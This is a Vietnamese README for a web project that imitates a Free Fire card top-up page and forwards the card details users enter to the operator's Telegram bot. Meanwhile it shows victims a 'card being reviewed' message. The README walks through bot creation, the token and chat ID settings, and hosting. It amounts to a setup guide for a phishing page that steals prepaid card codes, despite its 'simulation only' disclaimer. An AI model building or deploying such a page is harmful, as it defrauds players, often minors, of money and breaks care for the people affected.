# Trang Nạp Thẻ Free Fire

Đây là một trang web mô phỏng nạp thẻ cho game Free Fire, với giao diện đơn giản chỉ bao gồm 1 file HTML và 1 file PHP để xử lý việc gửi thông tin đến Telegram bot.

## Cấu trúc thư mục

```
freefire-napthe/
├── index.html          # Trang web chính
├── telegram_bot.php    # File xử lý gửi thông tin đến Telegram
└── README.md           # File hướng dẫn này
```

## Cách cấu hình

1. Trước tiên, bạn cần tạo một bot Telegram và lấy token của bot:
   - Trò chuyện với [@BotFather](https://t.me/BotFather) trên Telegram
   - Sử dụng lệnh `/newbot` để tạo bot mới
   - Làm theo hướng dẫn và lấy API token của bot

2. Mở file `telegram_bot.php` và thay đổi các thông tin sau:
   ```php
   $botToken = "YOUR_TELEGRAM_BOT_TOKEN"; // Thay thế bằng token bot của bạn
   $chatId = "YOUR_CHAT_ID"; // Thay thế bằng ID chat của bạn hoặc nhóm
   ```

3. Để lấy Chat ID:
   - Nếu muốn gửi tin nhắn đến chat cá nhân: Trò chuyện với [@userinfobot](https://t.me/userinfobot) để lấy ID của bạn
   - Nếu muốn gửi tin nhắn đến nhóm: Thêm bot [@RawDataBot](https://t.me/RawDataBot) vào nhóm và lấy chat ID từ dữ liệu hiển thị

## Cách sử dụng

1. Tải các file lên máy chủ web của bạn hỗ trợ PHP (ví dụ: cPanel, Hosting Vietnam, Hostinger, v.v.)
2. Truy cập vào trang web qua domain hoặc IP máy chủ
3. Khi người dùng nhập thông tin nạp thẻ và ấn nút "Thanh toán", thông tin sẽ được gửi đến bot Telegram của bạn
4. Người dùng sẽ thấy thông báo "Thẻ đang được duyệt" và chờ xử lý

## Các tính năng

- Giao diện giống trang nạp thẻ game thật
- Chỉ bao gồm game Free Fire
- Modal thông báo "Thẻ đang duyệt" khi gửi thông tin
- Bảo mật token Telegram bot bằng cách tách riêng file PHP
- Hỗ trợ responsive trên mọi thiết bị

## Lưu ý bảo mật

- File `telegram_bot.php` chứa token của bot Telegram, nên bảo vệ file này khỏi truy cập trực tiếp nếu có thể
- Đây chỉ là trang web giả lập, không phải trang nạp thẻ chính thức của Garena
- Không lưu trữ hoặc sử dụng thông tin người dùng cho mục đích xấu

## Tùy chỉnh

Bạn có thể tùy chỉnh thêm các phần sau:
- Thay đổi hình ảnh, logo hoặc giao diện trong file HTML
- Thêm các chức năng xác thực hoặc bảo mật khác
- Thay đổi định dạng tin nhắn gửi đến Telegram trong file PHP
